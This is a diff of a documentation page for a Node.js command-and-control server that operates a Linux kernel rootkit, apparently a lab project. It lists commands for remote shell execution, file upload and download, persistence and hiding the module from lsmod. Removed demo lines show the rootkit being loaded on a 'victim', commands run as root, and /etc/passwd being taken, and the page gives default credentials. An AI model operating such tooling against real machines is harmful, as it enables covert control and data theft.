@@ -1,6 +1,6 @@
 ---
-title: "README"
-description: "C2 server and attacking program architecture"
+title: "Overview"
+description: "C2 server architecture and capabilities"
 icon: "dashboard"
 date: "2025-05-25T00:00:00+01:00"
 lastmod: "2025-05-25T16:00:00+01:00"
@@ -16,146 +16,82 @@ Professional C2 (Command & Control) server built with Node.js providing CLI inte
 ## Quick Start
 
 ```bash
-# Install and start
-cd attacking_program && pnpm install && pnpm start
-# Server started on port 4444
-# Web interface: http://localhost:3000
+# Install dependencies and start
+cd attacking_program
+pnpm install
+pnpm start
 
-# Basic usage
-c2-server$ ls
-# • Client-1 - UNAUTHENTICATED - Last seen: 6:13:09 PM
-
-c2-server$ auth Client-1 password
-# ✓ Authentication successful
+# Server output
+# ✓ Server started on port 4444
+# ✓ Web interface started on port 3000
 ```
 
 ## Architecture
 
 ### Core Components
-- **CLI Interface**: Vorpal.js-based interactive commands
-- **C2 Server**: Node.js TCP server for rootkit communication
-- **Web Interface**: Basic REST API and Socket.IO dashboard
+- **CLI Interface**: Vorpal.js-based interactive command system
+- **C2 Server**: TCP server handling rootkit connections on port 4444
+- **Web Interface**: Express.js REST API with Socket.IO on port 3000
+- **Client Manager**: Connection lifecycle and authentication management
+- **Event System**: Real-time event handling and logging
 
 ### Technology Stack
 - **Runtime**: Node.js 18+ with pnpm package manager
-- **CLI**: Vorpal.js for interactive command interface
-- **Server**: Express.js with Socket.IO for real-time updates
-- **Encryption**: Optional XOR cipher for traffic obfuscation (currently disabled on rootkit side)
+- **CLI Framework**: Vorpal.js for interactive commands
+- **Web Server**: Express.js with Socket.IO for real-time updates
+- **Encryption**: XOR cipher implementation (configurable)
 
-## CLI Commands
+## Core Features
 
 ### Client Management
 ```bash
 ls                          # List connected clients
-auth <client> <password>    # Authenticate with client using dynamic password
-status <client>             # Get client status information
+auth <client> <password>    # Authenticate with SHA-512 verification
+status <client>             # Get comprehensive rootkit status
+keepalive <client>          # Check connection health
+```
+
+### Remote Operations
+```bash
+exec <client> <command>                     # Execute shell commands
+upload <client> <local> [remote]            # Upload files to victim
+download <client> <remote> [local]          # Download files from victim
+```
+
+### Configuration Management
+```bash
 config <client>             # Interactive configuration menu
+persist <client> [action]   # Manage persistence mechanisms
 ```
 
-### Operations
-```bash
-exec <client> <command>                     # Execute shell command
-upload <client> <local> <remote>            # Upload file to victim
-download <client> <remote> <local>          # Download file from victim
-```
+## Authentication System
 
-## Interactive Configuration
+**SHA-512 Password Authentication:**
+1. C2 sends plaintext password via `auth` command
+2. Rootkit hashes password and compares with stored hash
+3. Session established with 1-hour timeout
+4. Rate limiting: 5 attempts per 60 seconds
 
-```bash
-c2-server$ config Client-1
-# ┌─ Rootkit Configuration - Client-1
-#   • [X] Module Hiding: ENABLED
-#   • [X] Persistence: ENABLED
-# 
-# ? Select option: Toggle Module Hiding
-# ✓ Module hiding disabled
-```
-
-Available options:
-- **Module Hiding**: Show/hide rootkit from `lsmod`
-- **Persistence**: Install/remove boot persistence
-- **Status Refresh**: Update current configuration
-
-## Live Demo Session
-
-### Connection & Authentication
-```bash
-# Start server
-pnpm start
-
-# Load rootkit on victim
-sudo insmod epirootkit.ko
-# [C2 shows] New client connected: Client-1
-
-# Authenticate with dynamic password
-c2-server$ auth Client-1 password
-# ✓ Authentication successful
-```
-
-### Command Execution
-```bash
-c2-server$ exec Client-1 whoami
-# Exit code: 0
-# Output:
-# root
-
-c2-server$ exec Client-1 uname -a
-# Exit code: 0
-# Output:
-# Linux victim 5.4.0-74-generic #83-Ubuntu...
-```
-
-### File Operations
-```bash
-c2-server$ upload Client-1 ./test.txt /tmp/test.txt
-# ✓ File uploaded successfully (1024 bytes)
-
-c2-server$ download Client-1 /etc/passwd ./passwd_copy
-# ✓ File downloaded successfully (2048 bytes)
-```
+**Default Credentials:**
+- Password: `password`
+- Hash: `b109f3bbbc244eb82441917ed06d618b9008dd09b3befd1b5e07394c706a8bb980b1d7785e5976ec049b46df5f1326af5a2ea6d103fd07c95385ffab0cacbc86`
 
 ## Configuration
 
-### Server Settings
+### Server Settings (`config.env`)
 ```bash
-# attacking_program/config.env
 C2_PORT=4444                    # C2 server port
 WEB_PORT=3000                   # Web interface port
-ENABLE_ENCRYPTION=true          # Enable XOR encryption (rootkit has it disabled)
-ENCRYPTION_KEY=MySecretKey123   # Encryption key
-PASSWORD_HASH=b109f3bbbc244eb82441917ed06d618b9008dd09b3befd1b5e07394c706a8bb980b1d7785e5976ec049b46df5f1326af5a2ea6d103fd07c95385ffab0cacbc86  # SHA-512 hash of "password"
+ENCRYPTION_KEY=0123456789abcdef0123456789abcdef  # 32-char hex key
+ENABLE_ENCRYPTION=true          # XOR encryption toggle
+PASSWORD_HASH=b109f3bbbc244eb82441917ed06d618b9008dd09b3befd1b5e07394c706a8bb980b1d7785e5976ec049b46df5f1326af5a2ea6d103fd07c95385ffab0cacbc86
 ```
 
-### Authentication
-Uses dynamic password authentication where:
-1. C2 sends plain text password via `auth <client> <password>` command
-2. Rootkit hashes the password using SHA-512 and compares with stored hash
-3. Authentication response indicates success/failure
-4. Includes rate limiting (5 attempts max) and session timeout (1 hour)
 
 ## Security Features
 
-- **Dynamic authentication**: SHA-512 hashing with brute force protection
-- **Optional encryption**: XOR cipher for traffic obfuscation (currently mismatched - enabled on C2, disabled on rootkit)
-- **Session management**: Automatic timeout and cleanup
-- **Access control**: Commands require authentication
-
-## Web Interface
-
-Basic web dashboard available at `http://localhost:3000` with:
-- REST API for client management
-- Socket.IO for real-time updates
-- Simple client status dashboard
-
-## Current Configuration Issues
-
-**⚠️ Encryption Mismatch**: The C2 server has encryption enabled (`ENABLE_ENCRYPTION=true`) but the rootkit has it disabled (`ENABLE_ENCRYPTION 0`). This means:
-- C2 expects encrypted communication
-- Rootkit sends unencrypted messages
-- Communication works but is unencrypted despite C2 configuration
-
-To fix: Either enable encryption in rootkit or disable it in C2 server.
-
----
-
-Provides complete C2 functionality with professional CLI interface and web dashboard for rootkit management. 
+- **Authentication**: SHA-512 hashing with brute force protection
+- **Encryption**: Optional XOR cipher for traffic obfuscation
+- **Session Management**: Automatic timeout and cleanup
+- **Access Control**: Commands require authentication
+- **Connection Health**: Automatic stale client detection
